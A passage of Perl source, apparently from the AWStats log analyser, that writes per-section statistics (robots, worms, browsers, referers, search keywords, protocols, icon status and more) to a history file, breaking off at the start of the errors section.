			  . "${xmlrs}"
			  . int( $_login_h{$_} || 0 )
			  . "${xmlrs}"
			  . int( $_login_k{$_} || 0 )
			  . "${xmlrs}"
			  . ( $_login_l{$_} || '' )
			  . "${xmlre}\n";
		}
		foreach ( keys %_login_h ) {
			if ( $keysinkeylist{$_} ) { next; }
			print HISTORYTMP "${xmlrb}$_${xmlrs}"
			  . int( $_login_p{$_} || 0 )
			  . "${xmlrs}"
			  . int( $_login_h{$_} || 0 )
			  . "${xmlrs}"
			  . int( $_login_k{$_} || 0 )
			  . "${xmlrs}"
			  . ( $_login_l{$_} || '' )
			  . "${xmlre}\n";
		}
		print HISTORYTMP "${xmleb}END_LOGIN${xmlee}\n";
	}
	
	# Robot
	if ( $sectiontosave eq 'robot' ) {
		print HISTORYTMP "\n";
		if ($xml) {
			print HISTORYTMP "<section id='$sectiontosave'><sortfor>$MaxNbOf{'RobotShown'}</sortfor><comment>";
		}
		my $r1 = $translate_map{"Robot ID - Hits - Bandwidth - Last visit - Hits on robots.txt"} // "Robot ID - Hits - Bandwidth - Last visit - Hits on robots.txt";
		my $r2 = sprintf($translate_map{"The first %s items are sorted by hits in descending order; order of the remaining items is undefined."} // "The first %s items are sorted by hits in descending order; order of the remaining items is undefined.", $MaxNbOf{'RobotShown'});
		print HISTORYTMP "# $r1\n";
		print HISTORYTMP "# $r2\n";
		$ValueInFile{$sectiontosave} = tell HISTORYTMP;
		print HISTORYTMP "${xmlbb}BEGIN_ROBOT${xmlbs}"
		  . ( scalar keys %_robot_h )
		  . "${xmlbe}\n";

		# We save robot list in score sorted order to get a -output faster and with less use of memory.
		&BuildKeyList( $MaxNbOf{'RobotShown'}, $MinHit{'Robot'}, \%_robot_h, \%_robot_h );
		my %keysinkeylist = ();
		foreach (@keylist) {
			$keysinkeylist{$_} = 1;
			print HISTORYTMP "${xmlrb}$_${xmlrs}"
			  . int( $_robot_h{$_} )
			  . "${xmlrs}"
			  . int( $_robot_k{$_} )
			  . "${xmlrs}$_robot_l{$_}${xmlrs}"
			  . int( $_robot_r{$_} || 0 )
			  . "${xmlre}\n";
		}
		foreach ( keys %_robot_h ) {
			if ( $keysinkeylist{$_} ) { next; }
			print HISTORYTMP "${xmlrb}$_${xmlrs}"
			  . int( $_robot_h{$_} )
			  . "${xmlrs}"
			  . int( $_robot_k{$_} )
			  . "${xmlrs}$_robot_l{$_}${xmlrs}"
			  . int( $_robot_r{$_} || 0 )
			  . "${xmlre}\n";
		}
		print HISTORYTMP "${xmleb}END_ROBOT${xmlee}\n";
	}
	
	# Worms
	if ( $sectiontosave eq 'worms' ) {
		print HISTORYTMP "\n";
		if ($xml) {
			print HISTORYTMP "<section id='$sectiontosave'><sortfor>$MaxNbOf{'WormsShown'}</sortfor><comment>";
		}
		my $w1 = $translate_map{"Worm ID - Hits - Bandwidth - Last visit"} // "Worm ID - Hits - Bandwidth - Last visit";
		my $w2 = sprintf($translate_map{"The first %s items are sorted by hits in descending order; order of the remaining items is undefined."} // "The first %s items are sorted by hits in descending order; order of the remaining items is undefined.", $MaxNbOf{'WormsShown'});
		print HISTORYTMP "# $w1\n";
		print HISTORYTMP "# $w2\n";
		$ValueInFile{$sectiontosave} = tell HISTORYTMP;
		print HISTORYTMP "${xmlbb}BEGIN_WORMS${xmlbs}"
		  . ( scalar keys %_worm_h )
		  . "${xmlbe}\n";

		# We save worm list in score sorted order to get a -output faster and with less use of memory.
		&BuildKeyList( $MaxNbOf{'WormsShown'}, $MinHit{'Worm'}, \%_worm_h, \%_worm_h );
		my %keysinkeylist = ();
		foreach (@keylist) {
			$keysinkeylist{$_} = 1;
			print HISTORYTMP "${xmlrb}$_${xmlrs}"
			  . int( $_worm_h{$_} )
			  . "${xmlrs}"
			  . int( $_worm_k{$_} )
			  . "${xmlrs}$_worm_l{$_}${xmlre}\n";
		}
		foreach ( keys %_worm_h ) {
			if ( $keysinkeylist{$_} ) { next; }
			print HISTORYTMP "${xmlrb}$_${xmlrs}"
			  . int( $_worm_h{$_} )
			  . "${xmlrs}"
			  . int( $_worm_k{$_} )
			  . "${xmlrs}$_worm_l{$_}${xmlre}\n";
		}
		print HISTORYTMP "${xmleb}END_WORMS${xmlee}\n";
	}
	
	# Email Sender
	if ( $sectiontosave eq 'emailsender' ) {
		print HISTORYTMP "\n";
		if ($xml) {
			print HISTORYTMP "<section id='$sectiontosave'><sortfor>$MaxNbOf{'EMailsShown'}</sortfor><comment>";
		}
		my $e1 = $translate_map{"EMail - Hits - Bandwidth - Last visit"} // "EMail - Hits - Bandwidth - Last visit";
		my $e2 = sprintf($translate_map{"The first %s email addresses are sorted by hits in descending order; order of the remaining addresses is undefined."} // "The first %s email addresses are sorted by hits in descending order; order of the remaining addresses is undefined.", $MaxNbOf{'EMailsShown'});
		print HISTORYTMP "# $e1\n";
		print HISTORYTMP "# $e2\n";
		$ValueInFile{$sectiontosave} = tell HISTORYTMP;
		print HISTORYTMP "${xmlbb}BEGIN_EMAILSENDER${xmlbs}"
		  . ( scalar keys %_emails_h )
		  . "${xmlbe}\n";

		# We save sender email list in score sorted order to get a -output faster and with less use of memory.
		&BuildKeyList( $MaxNbOf{'EMailsShown'}, $MinHit{'EMail'}, \%_emails_h,
			\%_emails_h );
		my %keysinkeylist = ();
		foreach (@keylist) {
			$keysinkeylist{$_} = 1;
			print HISTORYTMP "${xmlrb}$_${xmlrs}"
			  . int( $_emails_h{$_} || 0 )
			  . "${xmlrs}"
			  . int( $_emails_k{$_} || 0 )
			  . "${xmlrs}$_emails_l{$_}${xmlre}\n";
		}
		foreach ( keys %_emails_h ) {
			if ( $keysinkeylist{$_} ) { next; }
			print HISTORYTMP "${xmlrb}$_${xmlrs}"
			  . int( $_emails_h{$_} || 0 )
			  . "${xmlrs}"
			  . int( $_emails_k{$_} || 0 )
			  . "${xmlrs}$_emails_l{$_}${xmlre}\n";
		}
		print HISTORYTMP "${xmleb}END_EMAILSENDER${xmlee}\n";
	}
	
	# Email Receiver
	if ( $sectiontosave eq 'emailreceiver' ) {
		print HISTORYTMP "\n";
		if ($xml) {
			print HISTORYTMP "<section id='$sectiontosave'><sortfor>$MaxNbOf{'EMailsShown'}</sortfor><comment>";
		}
		my $er1 = $translate_map{"EMail - Hits - Bandwidth - Last visit"} // "EMail - Hits - Bandwidth - Last visit";
		my $er2 = sprintf($translate_map{"The first %s email addresses are sorted by hits in descending order; order of the remaining addresses is undefined."} // "The first %s email addresses are sorted by hits in descending order; order of the remaining addresses is undefined.", $MaxNbOf{'EMailsShown'});
		print HISTORYTMP "# $er1\n";
		print HISTORYTMP "# $er2\n";
		$ValueInFile{$sectiontosave} = tell HISTORYTMP;
		print HISTORYTMP "${xmlbb}BEGIN_EMAILRECEIVER${xmlbs}"
		  . ( scalar keys %_emailr_h )
		  . "${xmlbe}\n";

		# We save receiver email list in score sorted order to get a -output faster and with less use of memory.
		&BuildKeyList( $MaxNbOf{'EMailsShown'}, $MinHit{'EMail'}, \%_emailr_h, \%_emailr_h );
		my %keysinkeylist = ();
		foreach (@keylist) {
			$keysinkeylist{$_} = 1;
			print HISTORYTMP "${xmlrb}$_${xmlrs}"
			  . int( $_emailr_h{$_} || 0 )
			  . "${xmlrs}"
			  . int( $_emailr_k{$_} || 0 )
			  . "${xmlrs}$_emailr_l{$_}${xmlre}\n";
		}
		foreach ( keys %_emailr_h ) {
			if ( $keysinkeylist{$_} ) { next; }
			print HISTORYTMP "${xmlrb}$_${xmlrs}"
			  . int( $_emailr_h{$_} || 0 )
			  . "${xmlrs}"
			  . int( $_emailr_k{$_} || 0 )
			  . "${xmlrs}$_emailr_l{$_}${xmlre}\n";
		}
		print HISTORYTMP "${xmleb}END_EMAILRECEIVER${xmlee}\n";
	}

	# This section must be saved after VISITOR section is read
	if ( $sectiontosave eq 'session' ) {
		print HISTORYTMP "\n";
		if ($xml) {
			print HISTORYTMP "<section id='$sectiontosave'><comment>";
		}
		my $s1 = $translate_map{"Session range - Number of visits"} // "Session range - Number of visits";
		print HISTORYTMP "# $s1\n";
		$ValueInFile{$sectiontosave} = tell HISTORYTMP;
		print HISTORYTMP "${xmlbb}BEGIN_SESSION${xmlbs}"
		  . ( scalar keys %_session )
		  . "${xmlbe}\n";
		foreach ( keys %_session ) {
			print HISTORYTMP "${xmlrb}$_${xmlrs}"
			  . int( $_session{$_} )
			  . "${xmlre}\n";
		}
		print HISTORYTMP "${xmleb}END_SESSION${xmlee}\n";
	}
	
	# This section must be saved after VISITOR section is read
	if ($sectiontosave eq 'filesize') {
		print HISTORYTMP "\n";
		if ($xml) {
			print HISTORYTMP "<section id='$sectiontosave'><comment>";
		}
		my $fs1 = $translate_map{"Payload Range - Payload Frequency"} // "Payload Range - Payload Frequency";
		print HISTORYTMP "# $fs1\n";
		$ValueInFile{$sectiontosave} = tell HISTORYTMP;
		print HISTORYTMP "${xmlbb}BEGIN_FILESIZE${xmlbs}"
		  . ( scalar keys %_filesize )
		  . "${xmlbe}\n";
		foreach ( keys %_filesize) {
			print HISTORYTMP "${xmlrb}$_${xmlrs}"
			  . int( $_filesize{$_} )
			  . "${xmlre}\n";
		}
		print HISTORYTMP "${xmleb}END_FILESIZE${xmlee}\n";
	}
	
	# Request Time
	if ( $sectiontosave eq 'requesttime' ) {
		print HISTORYTMP "\n";
		if ($xml) {
			print HISTORYTMP "<section id='$sectiontosave'><comment>";
		}
		my $rt1 = $translate_map{"Request Time Range - Request Time Frequency"} // "Request Time Range - Request Time Frequency";
		print HISTORYTMP "# $rt1\n";
		$ValueInFile{$sectiontosave} = tell HISTORYTMP;
		print HISTORYTMP "${xmlbb}BEGIN_REQUESTTIME${xmlbs}"
		  . ( scalar keys %_requesttime )
		  . "${xmlbe}\n";
		foreach ( keys %_requesttime ) {
			print HISTORYTMP "${xmlrb}$_${xmlrs}"
			  . int( $_requesttime{$_} )
			  . "${xmlre}\n";
		}
		print HISTORYTMP "${xmleb}END_REQUESTTIME${xmlee}\n";
	}
	
	# # This section must be saved after VISITOR section is read
	if ( $sectiontosave eq 'sider' ) {
		print HISTORYTMP "\n";
		if ($xml) {
			print HISTORYTMP "<section id='$sectiontosave'><sortfor>$MaxNbOf{'PageShown'}</sortfor><comment>";
		}
		my $sd1 = $translate_map{"URL - Pages - Bandwidth - Entry - Exit"} // "URL - Pages - Bandwidth - Entry - Exit";
		my $sd2 = sprintf($translate_map{"The %s first Pages must be first (order not required for others)"} // "The %s first Pages must be first (order not required for others)", $MaxNbOf{'PageShown'});
		print HISTORYTMP "# $sd1\n";
		print HISTORYTMP "# $sd2\n";
		$ValueInFile{$sectiontosave} = tell HISTORYTMP;
		print HISTORYTMP "${xmlbb}BEGIN_SIDER${xmlbs}"
		  . ( scalar keys %_url_p )
		  . "${xmlbe}\n";

		# We save page list in score sorted order to get a -output faster and with less use of memory.
		&BuildKeyList( $MaxNbOf{'PageShown'}, $MinHit{'File'}, \%_url_p,
			\%_url_p );
		%keysinkeylist = ();
		foreach (@keylist) {
			$keysinkeylist{$_} = 1;
			my $newkey = $_;
			$newkey =~ s/([^:])\/\//$1\//g;
			print HISTORYTMP "${xmlrb}"
			  . XMLEncodeForHisto($newkey)
			  . "${xmlrs}"
			  . int( $_url_p{$_} || 0 )
			  . "${xmlrs}"
			  . int( $_url_k{$_} || 0 )
			  . "${xmlrs}"
			  . int( $_url_e{$_} || 0 )
			  . "${xmlrs}"
			  . int( $_url_x{$_} || 0 )
			  . "${xmlre}\n";
		}
		foreach ( keys %_url_p ) {
			if ( $keysinkeylist{$_} ) { next; }
			my $newkey = $_;
			$newkey =~ s/([^:])\/\//$1\//g;
			print HISTORYTMP "${xmlrb}"
			  . XMLEncodeForHisto($newkey)
			  . "${xmlrs}"
			  . int( $_url_p{$_} || 0 )
			  . "${xmlrs}"
			  . int( $_url_k{$_} || 0 )
			  . "${xmlrs}"
			  . int( $_url_e{$_} || 0 )
			  . "${xmlrs}"
			  . int( $_url_x{$_} || 0 )
			  . "${xmlre}\n";
		}
		print HISTORYTMP "${xmleb}END_SIDER${xmlee}\n";
	}
	
	# File Types
	if ( $sectiontosave eq 'filetypes' ) {
		print HISTORYTMP "\n";
		if ($xml) {
			print HISTORYTMP "<section id='$sectiontosave'><comment>";
		}
		my $ft1 = $translate_map{"Files type - Hits - Bandwidth - Bandwidth without compression - Bandwidth after compression"} // "Files type - Hits - Bandwidth - Bandwidth without compression - Bandwidth after compression";
		print HISTORYTMP "# $ft1\n";
		$ValueInFile{$sectiontosave} = tell HISTORYTMP;
		print HISTORYTMP "${xmlbb}BEGIN_FILETYPES${xmlbs}"
		  . ( scalar keys %_filetypes_h )
		  . "${xmlbe}\n";
		foreach ( keys %_filetypes_h ) {
			my $hits        = $_filetypes_h{$_}      || 0;
			my $bytes       = $_filetypes_k{$_}      || 0;
			my $bytesbefore = $_filetypes_gz_in{$_}  || 0;
			my $bytesafter  = $_filetypes_gz_out{$_} || 0;
			print HISTORYTMP "${xmlrb}$_${xmlrs}$hits${xmlrs}$bytes${xmlrs}$bytesbefore${xmlrs}$bytesafter${xmlre}\n";
		}
		print HISTORYTMP "${xmleb}END_FILETYPES${xmlee}\n";
	}
	
	# Downloads
	if ( $sectiontosave eq 'downloads' ) {
		print HISTORYTMP "\n";
		if ($xml) {
			print HISTORYTMP "<section id='$sectiontosave'><comment>";
		}
		my $dl1 = $translate_map{"Downloads - Hits - Bandwidth"} // "Downloads - Hits - Bandwidth";
		print HISTORYTMP "# $dl1\n";
		$ValueInFile{$sectiontosave} = tell HISTORYTMP;
		print HISTORYTMP "${xmlbb}BEGIN_DOWNLOADS${xmlbs}"
		  . ( scalar keys %_downloads )
		  . "${xmlbe}\n";
		for my $u (sort {$_downloads{$b}->{'AWSTATS_HITS'} <=> $_downloads{$a}->{'AWSTATS_HITS'}}(keys %_downloads) ){
			print HISTORYTMP "${xmlrb}"
			  . XMLEncodeForHisto($u)
			  . "${xmlrs}"
			  . XMLEncodeForHisto($_downloads{$u}->{'AWSTATS_HITS'} || 0)
			  . "${xmlrs}"
			  . XMLEncodeForHisto($_downloads{$u}->{'AWSTATS_206'} || 0)
			  ."${xmlrs}"
			  . XMLEncodeForHisto($_downloads{$u}->{'AWSTATS_SIZE'} || 0)
			  ."${xmlre}\n";
		}
		print HISTORYTMP "${xmleb}END_DOWNLOADS${xmlee}\n";
	}
	
	# OS
	if ( $sectiontosave eq 'os' ) {
		print HISTORYTMP "\n";
		if ($xml) {
			print HISTORYTMP "<section id='$sectiontosave'><comment>";
		}
		print HISTORYTMP "# OS ID - Hits\n";
		$ValueInFile{$sectiontosave} = tell HISTORYTMP;
		print HISTORYTMP "${xmlbb}BEGIN_OS ID - Hits - Pages${xmlbs}"
		  . ( scalar keys %_os_h )
		  . "${xmlbe}\n";
		foreach ( keys %_os_h ) {
			my $hits        = $_os_h{$_}      || 0;
			my $pages       = $_os_p{$_}      || 0;
			print HISTORYTMP "${xmlrb}$_${xmlrs}$hits${xmlrs}$pages${xmlre}\n";
		}
		print HISTORYTMP "${xmleb}END_OS${xmlee}\n";
	}
	
	# Device
	if ( $sectiontosave eq 'device' ) {
		print HISTORYTMP "\n";
		if ($xml) {
			print HISTORYTMP "<section id='$sectiontosave'><comment>";
		}
		print HISTORYTMP "# Device ID - Hits - Pages\n";
		$ValueInFile{$sectiontosave} = tell HISTORYTMP;
		print HISTORYTMP "${xmlbb}BEGIN_DEVICE${xmlbs}"
		. ( scalar keys %_device_h )
		. "${xmlbe}\n";
		foreach ( keys %_device_h ) {
			my $hits        = $_device_h{$_}      || 0;
			my $pages       = $_device_p{$_}      || 0;
			print HISTORYTMP "${xmlrb}$_${xmlrs}$hits${xmlrs}$pages${xmlre}\n";
		}
		print HISTORYTMP "${xmleb}END_DEVICE${xmlee}\n";
	}
	
	# Browser
	if ( $sectiontosave eq 'browser' ) {
		print HISTORYTMP "\n";
		if ($xml) {
			print HISTORYTMP "<section id='$sectiontosave'><comment>";
		}
		my $br1 = $translate_map{"Browser ID - Hits - Pages"} // "Browser ID - Hits - Pages";
		print HISTORYTMP "# $br1\n";
		$ValueInFile{$sectiontosave} = tell HISTORYTMP;
		print HISTORYTMP "${xmlbb}BEGIN_BROWSER${xmlbs}"
		  . ( scalar keys %_browser_h )
		  . "${xmlbe}\n";
		foreach ( keys %_browser_h ) {
			my $hits        = $_browser_h{$_}      || 0;
			my $pages       = $_browser_p{$_}      || 0;
			print HISTORYTMP "${xmlrb}$_${xmlrs}$hits${xmlrs}$pages${xmlre}\n";
		}
		print HISTORYTMP "${xmleb}END_BROWSER${xmlee}\n";
	}
	
	# Screen Size
	if ( $sectiontosave eq 'screensize' ) {
		print HISTORYTMP "\n";
		if ($xml) {
			print HISTORYTMP "<section id='$sectiontosave'><comment>";
		}
		my $ss1 = $translate_map{"Screen size - Hits"} // "Screen size - Hits";
		print HISTORYTMP "# $ss1\n";
		$ValueInFile{$sectiontosave} = tell HISTORYTMP;
		print HISTORYTMP "${xmlbb}BEGIN_SCREENSIZE${xmlbs}"
		  . ( scalar keys %_screensize_h )
		  . "${xmlbe}\n";
		foreach ( keys %_screensize_h ) {
			print HISTORYTMP "${xmlrb}$_${xmlrs}$_screensize_h{$_}${xmlre}\n";
		}
		print HISTORYTMP "${xmleb}END_SCREENSIZE${xmlee}\n";
	}

	# Unknown Referer OS
	if ( $sectiontosave eq 'unknownreferer' ) {
		print HISTORYTMP "\n";
		if ($xml) {
			print HISTORYTMP "<section id='$sectiontosave'><comment>";
		}
		my $ur1 = $translate_map{"Unknown referer OS - Last visit date"} // "Unknown referer OS - Last visit date";
		print HISTORYTMP "# $ur1\n";
		$ValueInFile{$sectiontosave} = tell HISTORYTMP;
		print HISTORYTMP "${xmlbb}BEGIN_UNKNOWNREFERER${xmlbs}"
		  . ( scalar keys %_unknownreferer_l )
		  . "${xmlbe}\n";
		foreach ( keys %_unknownreferer_l ) {
			print HISTORYTMP "${xmlrb}"
			  . XMLEncodeForHisto($_)
			  . "${xmlrs}$_unknownreferer_l{$_}${xmlre}\n";
		}
		print HISTORYTMP "${xmleb}END_UNKNOWNREFERER${xmlee}\n";
	}
	
	# Unknown Referer Browser
	if ( $sectiontosave eq 'unknownrefererbrowser' ) {
		print HISTORYTMP "\n";
		if ($xml) {
			print HISTORYTMP "<section id='$sectiontosave'><comment>";
		}
		my $urb1 = $translate_map{"Unknown referer Browser - Last visit date"} // "Unknown referer Browser - Last visit date";
		print HISTORYTMP "# $urb1\n";
		$ValueInFile{$sectiontosave} = tell HISTORYTMP;
		print HISTORYTMP "${xmlbb}BEGIN_UNKNOWNREFERERBROWSER${xmlbs}"
		  . ( scalar keys %_unknownrefererbrowser_l )
		  . "${xmlbe}\n";
		foreach ( keys %_unknownrefererbrowser_l ) {
			print HISTORYTMP "${xmlrb}"
			  . XMLEncodeForHisto($_)
			  . "${xmlrs}$_unknownrefererbrowser_l{$_}${xmlre}\n";
		}
		print HISTORYTMP "${xmleb}END_UNKNOWNREFERERBROWSER${xmlee}\n";
	}
	
	# Origin
	if ( $sectiontosave eq 'origin' ) {
		print HISTORYTMP "\n";
		if ($xml) {
			print HISTORYTMP "<section id='$sectiontosave'><comment>";
		}
		my $o1 = $translate_map{"Origin - Pages - Hits"} // "Origin - Pages - Hits";
		print HISTORYTMP "# $o1\n";
		$ValueInFile{$sectiontosave} = tell HISTORYTMP;
		print HISTORYTMP "${xmlbb}BEGIN_ORIGIN${xmlbs}6" . "${xmlbe}\n";
		print HISTORYTMP "${xmlrb}From0${xmlrs}"
		  . int( $_from_p[0] )
		  . "${xmlrs}"
		  . int( $_from_h[0] )
		  . "${xmlre}\n";
		print HISTORYTMP "${xmlrb}From1${xmlrs}"
		  . int( $_from_p[1] )
		  . "${xmlrs}"
		  . int( $_from_h[1] )
		  . "${xmlre}\n";
		print HISTORYTMP "${xmlrb}From2${xmlrs}"
		  . int( $_from_p[2] )
		  . "${xmlrs}"
		  . int( $_from_h[2] )
		  . "${xmlre}\n";
		print HISTORYTMP "${xmlrb}From3${xmlrs}"
		  . int( $_from_p[3] )
		  . "${xmlrs}"
		  . int( $_from_h[3] )
		  . "${xmlre}\n";
		print HISTORYTMP "${xmlrb}From4${xmlrs}"
		  . int( $_from_p[4] )
		  . "${xmlrs}"
		  . int( $_from_h[4] )
		  . "${xmlre}\n";
		print HISTORYTMP "${xmlrb}From5${xmlrs}"
		  . int( $_from_p[5] )
		  . "${xmlrs}"
		  . int( $_from_h[5] )
		  . "${xmlre}\n";
		print HISTORYTMP "${xmleb}END_ORIGIN${xmlee}\n";
	}
	
	# Search Engine Referrals
	if ( $sectiontosave eq 'sereferrals' ) {
		print HISTORYTMP "\n";
		if ($xml) {
			print HISTORYTMP "<section id='$sectiontosave'><comment>";
		}
		my $se1 = $translate_map{"Search engine referers ID - Pages - Hits"} // "Search engine referers ID - Pages - Hits";
		print HISTORYTMP "# $se1\n";
		$ValueInFile{$sectiontosave} = tell HISTORYTMP;
		print HISTORYTMP "${xmlbb}BEGIN_SEREFERRALS${xmlbs}"
		  . ( scalar keys %_se_referrals_h )
		  . "${xmlbe}\n";
		foreach ( keys %_se_referrals_h ) {
			print HISTORYTMP "${xmlrb}$_${xmlrs}"
			  . int( $_se_referrals_p{$_} || 0 )
			  . "${xmlrs}$_se_referrals_h{$_}${xmlre}\n";
		}
		print HISTORYTMP "${xmleb}END_SEREFERRALS${xmlee}\n";
	}
	
	# Page Referers
	if ( $sectiontosave eq 'pagerefs' ) {
		print HISTORYTMP "\n";
		if ($xml) {
			print HISTORYTMP "<section id='$sectiontosave'><sortfor>$MaxNbOf{'RefererShown'}</sortfor><comment>";
		}
		my $pr1 = $translate_map{"External page referers - Pages - Hits"} // "External page referers - Pages - Hits";
		my $pr2 = sprintf($translate_map{"Only top %s external referrers shown on main page (sorted by pages). See full list on detail page."} // "Only top %s external referrers shown on main page (sorted by pages). See full list on detail page.", $MaxNbOf{'RefererShown'});
		print HISTORYTMP "# $pr1\n";
		print HISTORYTMP "# $pr2\n";
		$ValueInFile{$sectiontosave} = tell HISTORYTMP;
		print HISTORYTMP "${xmlbb}BEGIN_PAGEREFS${xmlbs}"
		  . ( scalar keys %_pagesrefs_h )
		  . "${xmlbe}\n";

		# We save page list in score sorted order to get a -output faster and with less use of memory.
		&BuildKeyList( $MaxNbOf{'RefererShown'}, $MinHit{'Refer'}, \%_pagesrefs_h, \%_pagesrefs_p );
		%keysinkeylist = ();
		foreach (@keylist) {
			$keysinkeylist{$_} = 1;
			my $newkey = $_;
			$newkey =~ s/^http(s|):\/\/([^\/]+)\/$/http$1:\/\/$2/i;
			print HISTORYTMP "${xmlrb}"
			  . XMLEncodeForHisto($newkey)
			  . "${xmlrs}"
			  . int( $_pagesrefs_p{$_} || 0 )
			  . "${xmlrs}$_pagesrefs_h{$_}${xmlre}\n";
		}
		foreach ( keys %_pagesrefs_h ) {
			if ( $keysinkeylist{$_} ) { next; }
			my $newkey = $_;
			$newkey =~ s/^http(s|):\/\/([^\/]+)\/$/http$1:\/\/$2/i; 
			print HISTORYTMP "${xmlrb}"
			  . XMLEncodeForHisto($newkey)
			  . "${xmlrs}"
			  . int( $_pagesrefs_p{$_} || 0 )
			  . "${xmlrs}$_pagesrefs_h{$_}${xmlre}\n";
		}
		print HISTORYTMP "${xmleb}END_PAGEREFS${xmlee}\n";
	}
	
	# Search Words (Keyphrases & Keywords)
	if ( $sectiontosave eq 'searchwords' ) {
		print HISTORYTMP "\n";
		if ($xml) {
			print HISTORYTMP "<section id='$sectiontosave'><sortfor>$MaxNbOf{'KeyphrasesShown'}</sortfor><comment>";
		}
		my $sw1 = $translate_map{"Search keyphrases - Number of search"} // "Search keyphrases - Number of search";
		my $sw2 = sprintf($translate_map{"Only top %s keyphrases shown on main page (sorted by search count). See full list on detail page."} // "Only top %s keyphrases shown on main page (sorted by search count). See full list on detail page.", $MaxNbOf{'KeyphrasesShown'});
		print HISTORYTMP "# $sw1\n";
		print HISTORYTMP "# $sw2\n";
		$ValueInFile{$sectiontosave} = tell HISTORYTMP;
		print HISTORYTMP "${xmlbb}BEGIN_SEARCHWORDS${xmlbs}"
		  . ( scalar keys %_keyphrases )
		  . "${xmlbe}\n";

		# We will also build _keywords
		%_keywords = ();

		# We save key list in score sorted order to get a -output faster and with less use of memory.
		&BuildKeyList( $MaxNbOf{'KeywordsShown'}, $MinHit{'Keyword'}, \%_keyphrases, \%_keyphrases );
		%keysinkeylist = ();
		foreach my $key (@keylist) {
			$keysinkeylist{$key} = 1;
			my $keyphrase = $key;
			$keyphrase =~ tr/ /\+/s;
			print HISTORYTMP "${xmlrb}"
			  . XMLEncodeForHisto($keyphrase)
			  . "${xmlrs}"
			  . $_keyphrases{$key}
			  . "${xmlre}\n";
			foreach ( split( /\+/, $key ) ) {
				$_keywords{$_} += $_keyphrases{$key};
			}
		}
		foreach my $key ( keys %_keyphrases ) {
			if ( $keysinkeylist{$key} ) { next; }
			my $keyphrase = $key;
			$keyphrase =~ tr/ /\+/s;
			print HISTORYTMP "${xmlrb}"
			  . XMLEncodeForHisto($keyphrase)
			  . "${xmlrs}"
			  . $_keyphrases{$key}
			  . "${xmlre}\n";
			foreach ( split( /\+/, $key ) ) {
				$_keywords{$_} += $_keyphrases{$key};
			}
		}
		print HISTORYTMP "${xmleb}END_SEARCHWORDS${xmlee}\n";

		# Keywords section
		print HISTORYTMP "\n";
		if ($xml) { 
			print HISTORYTMP "<section id='keywords'><sortfor>$MaxNbOf{'KeywordsShown'}</sortfor><comment>";
		}
		my $kw1 = $translate_map{"Search keywords - Number of search"} // "Search keywords - Number of search";
		my $kw2 = sprintf($translate_map{"Only top %s keywords shown on main page (sorted by search count). See full list on detail page."} // "Only top %s keywords shown on main page (sorted by search count). See full list on detail page.", $MaxNbOf{'KeywordsShown'});
		print HISTORYTMP "# $kw1\n";
		print HISTORYTMP "# $kw2\n";
		$ValueInFile{"keywords"} = tell HISTORYTMP;
		print HISTORYTMP "${xmlbb}BEGIN_KEYWORDS${xmlbs}"
		  . ( scalar keys %_keywords )
		  . "${xmlbe}\n";
		&BuildKeyList( $MaxNbOf{'KeywordsShown'}, $MinHit{'Keyword'}, \%_keywords, \%_keywords );
		%keysinkeylist = ();
		foreach (@keylist) {
			$keysinkeylist{$_} = 1;
			my $keyword = $_;
			print HISTORYTMP "${xmlrb}"
			  . XMLEncodeForHisto($keyword)
			  . "${xmlrs}"
			  . $_keywords{$_}
			  . "${xmlre}\n";
		}
		foreach ( keys %_keywords ) {
			if ( $keysinkeylist{$_} ) { next; }
			my $keyword = $_;
			print HISTORYTMP "${xmlrb}"
			  . XMLEncodeForHisto($keyword)
			  . "${xmlrs}"
			  . $_keywords{$_}
			  . "${xmlre}\n";
		}
		print HISTORYTMP "${xmleb}END_KEYWORDS${xmlee}\n";
	}
	
	# Cluster
	if ( $sectiontosave eq 'cluster' ) {
		print HISTORYTMP "\n";
		if ($xml) {
			print HISTORYTMP "<section id='$sectiontosave'><comment>";
		}
		my $cl1 = $translate_map{"Cluster ID - Pages - Hits - Bandwidth"} // "Cluster ID - Pages - Hits - Bandwidth";
		print HISTORYTMP "# $cl1\n";
		$ValueInFile{$sectiontosave} = tell HISTORYTMP;
		print HISTORYTMP "${xmlbb}BEGIN_CLUSTER${xmlbs}"
		  . ( scalar keys %_cluster_h )
		  . "${xmlbe}\n";
		foreach ( keys %_cluster_h ) {
			print HISTORYTMP "${xmlrb}$_${xmlrs}"
			  . int( $_cluster_p{$_} || 0 )
			  . "${xmlrs}"
			  . int( $_cluster_h{$_} || 0 )
			  . "${xmlrs}"
			  . int( $_cluster_k{$_} || 0 )
			  . "${xmlre}\n";
		}
		print HISTORYTMP "${xmleb}END_CLUSTER${xmlee}\n";
	}
	
	# Protocol
	if ( $sectiontosave eq 'protocol' ) {
		print HISTORYTMP "\n";
		if ($xml) {
			print HISTORYTMP "<section id='$sectiontosave'><comment>";
		}
		my $p1 = $translate_map{"Protocol - Hits - Bandwidth"} // "Protocol - Hits - Bandwidth";
		print HISTORYTMP "# $p1\n";
		$ValueInFile{$sectiontosave} = tell HISTORYTMP;
		print HISTORYTMP "${xmlbb}BEGIN_PROTOCOL${xmlbs}"
		. ( scalar keys %_protocol_h )
		. "${xmlbe}\n";
		foreach my $proto (keys %_protocol_h) {
			print HISTORYTMP "${xmlrb}$proto${xmlrs}"
			. int( $_protocol_h{$proto} )
			. "${xmlrs}"
			. int( $_protocol_k{$proto} || 0 )
			. "${xmlre}\n";
		}
		print HISTORYTMP "${xmleb}END_PROTOCOL${xmlee}\n";
	}
	
	# Icon Status
	if ( $sectiontosave eq 'iconstatus' ) {
		print HISTORYTMP "\n";
		if ($xml) {
			print HISTORYTMP "<section id='$sectiontosave'><comment>";
		}
		my $is1 = $translate_map{"Icon Status - Type:200:404:Other"} // "Icon Status - Type:200:404:Other";
		print HISTORYTMP "# $is1\n";
		$ValueInFile{$sectiontosave} = tell HISTORYTMP;
		print HISTORYTMP "${xmlbb}BEGIN_ICONSTATUS${xmlbs}"
		. ( scalar keys %_icon_status )
		. "${xmlbe}\n";
		
		my @icon_types = qw(favicon apple_touch logo style_icon core_icon other);
		foreach my $type (@icon_types) {
			next unless exists $_icon_status{$type};
			my $ok    = $_icon_status{$type}{'200'}   || 0;
			my $miss  = $_icon_status{$type}{'404'}   || 0;
			my $other = $_icon_status{$type}{'other'} || 0;
			print HISTORYTMP "${xmlrb}$type${xmlrs}$ok${xmlrs}$miss${xmlrs}$other${xmlre}\n";
		}
		print HISTORYTMP "${xmleb}END_ICONSTATUS${xmlee}\n";
	}
	
	# Errors
	if ( $sectiontosave eq 'errors' ) {
		print HISTORYTMP "\n";
		if ($xml) {
			print HISTORYTMP "<section id='$sectiontosave'><comment>";
